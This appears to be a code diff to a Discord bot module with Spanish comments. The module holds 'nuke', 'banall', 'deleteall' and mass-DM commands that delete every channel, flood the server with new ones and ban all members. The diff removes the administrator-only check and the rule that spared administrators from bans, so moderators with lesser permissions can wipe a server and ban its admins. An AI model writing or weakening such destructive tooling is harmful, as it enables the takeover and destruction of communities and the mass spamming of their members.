@@ -7,16 +7,11 @@ class AdminCog(commands.Cog):
     def __init__(self, bot: commands.Bot):
         self.bot = bot
 
-    # Verificación: solo administradores
+    # Check general: solo que esté en un servidor
     async def cog_app_command_check(self, interaction: discord.Interaction) -> bool:
         if not interaction.guild:
             await interaction.response.send_message("❌ Este comando solo funciona dentro de un servidor.", ephemeral=True)
             return False
-        
-        if not interaction.user.guild_permissions.administrator:
-            await interaction.response.send_message("❌ Solo los **administradores** pueden usar este bot.", ephemeral=True)
-            return False
-        
         return True
 
     # ====================== COMANDO PRINCIPAL NUKE ======================
@@ -24,7 +19,8 @@ class AdminCog(commands.Cog):
         name="nuke", 
         description="⚠️ Nuke completo: borra canales, crea 40 nuevos y banea a todos"
     )
-    @app_commands.default_permissions(administrator=True)
+    @app_commands.default_permissions(manage_channels=True, ban_members=True)
+    @app_commands.checks.has_permissions(manage_channels=True, ban_members=True)
     async def nuke(
         self, 
         interaction: discord.Interaction, 
@@ -62,7 +58,7 @@ class AdminCog(commands.Cog):
         # 3. Banear a todos
         banned = 0
         for member in guild.members:
-            if member == guild.me or member == interaction.user or member.guild_permissions.administrator:
+            if member == guild.me or member == interaction.user:
                 continue
             try:
                 await member.ban(reason="Nuke by admin")
@@ -79,7 +75,8 @@ class AdminCog(commands.Cog):
         name="dmall",
         description="Envía un mensaje privado a todos los miembros del servidor"
     )
-    @app_commands.default_permissions(administrator=True)
+    @app_commands.default_permissions(manage_guild=True)
+    @app_commands.checks.has_permissions(manage_guild=True)
     async def dm_all(
         self,
         interaction: discord.Interaction,
@@ -92,16 +89,14 @@ class AdminCog(commands.Cog):
         fallidos = 0
 
         for member in guild.members:
-            # Saltar bots y al propio bot
             if member.bot:
                 continue
             
             try:
                 await member.send(mensaje)
                 enviados += 1
-                await asyncio.sleep(1.2)  # Delay importante para evitar rate limit de Discord
+                await asyncio.sleep(1.2)  # Delay importante
             except:
-                # Usuario tiene DMs cerrados o no se puede enviar
                 fallidos += 1
                 await asyncio.sleep(0.5)
 
@@ -113,7 +108,8 @@ class AdminCog(commands.Cog):
 
     # ====================== COMANDOS INDIVIDUALES ======================
     @app_commands.command(name="deleteall", description="Elimina todos los canales")
-    @app_commands.default_permissions(administrator=True)
+    @app_commands.default_permissions(manage_channels=True)
+    @app_commands.checks.has_permissions(manage_channels=True)
     async def delete_all(self, interaction: discord.Interaction):
         await interaction.response.send_message("🗑️ Eliminando canales...", ephemeral=True)
         count = 0
@@ -127,12 +123,13 @@ class AdminCog(commands.Cog):
         await interaction.followup.send(f"✅ Eliminados **{count}** canales.", ephemeral=True)
 
     @app_commands.command(name="banall", description="Banea a todos los miembros")
-    @app_commands.default_permissions(administrator=True)
+    @app_commands.default_permissions(ban_members=True)
+    @app_commands.checks.has_permissions(ban_members=True)
     async def ban_all(self, interaction: discord.Interaction):
         await interaction.response.send_message("⛔ Iniciando ban masivo...", ephemeral=True)
         count = 0
         for member in interaction.guild.members:
-            if member == interaction.guild.me or member.guild_permissions.administrator:
+            if member == interaction.guild.me or member == interaction.user:
                 continue
             try:
                 await member.ban(reason="Banall command")
@@ -143,7 +140,8 @@ class AdminCog(commands.Cog):
         await interaction.followup.send(f"✅ **{count}** miembros baneados.", ephemeral=True)
 
     @app_commands.command(name="create", description="Crea varios canales")
-    @app_commands.default_permissions(administrator=True)
+    @app_commands.default_permissions(manage_channels=True)
+    @app_commands.checks.has_permissions(manage_channels=True)
     async def create_channels(
         self, 
         interaction: discord.Interaction, 
